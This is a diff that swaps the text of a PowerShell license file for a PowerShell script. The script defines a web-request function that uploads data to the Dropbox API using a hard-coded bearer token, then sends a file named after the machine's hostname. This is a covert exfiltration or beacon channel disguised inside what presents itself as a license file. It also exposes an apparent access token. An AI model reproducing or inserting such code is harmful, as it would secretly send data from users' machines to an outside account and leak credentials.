@@ -1,23 +1,33 @@
-PowerShell 6.0
+function Invoke-Webclient{
+    param(        
+        [String]$Body = "",
+        [String]$Header = ""
+    )
+    $WebRequest = [System.Net.WebRequest]::Create('https://content.dropboxapi.com/2/files/upload')
+    $WebRequest.Method = "Post"
+    $WebRequest.ContentType = "application/octet-stream"
+    $PostStr = [System.Text.Encoding]::UTF8.GetBytes($Body)
+    
+    $WebRequest.ContentLength = $PostStr.Length
+    $WebRequest.Headers.Add("Authorization", "Bearer bkui_hwQ3XAAAAAAAAAAChO0V1EdSy7q6Ccyh8NzaVuGEn5tr4r1ZCxqdpsBzRbq")
+    $Head = $Header.SubString(0,($Header.IndexOf(":")))
+    $Value = $Header.SubString(($Header.IndexOf(":") + 1))
+    $WebRequest.Headers.Add($Head, $Value)
 
-Copyright (c) Microsoft Corporation. All rights reserved.
 
-MIT License
+    $requestStream = $WebRequest.GetRequestStream()
+    $requestStream.Write($PostStr, 0,$PostStr.length)
+    $requestStream.Close()
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the ""Software""), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+    $Response = $WebRequest.GetResponse()
+    $ResponseStream = $Response.GetResponseStream()
+    $ReadStream = New-Object System.IO.StreamReader $ResponseStream
+    $Data=$ReadStream.ReadToEnd()
+    $Data
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED *AS IS*, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+}
+$hostname = hostname
+$path_inet = "/" + $hostname + ".csv"
+$header = 'Dropbox-API-Arg: {"path": "' + $path_inet + '","mode": "add","autorename": true,"mute": false}'
+$content = 'test'
+Invoke-Webclient -Header $header -Body $content | Out-null
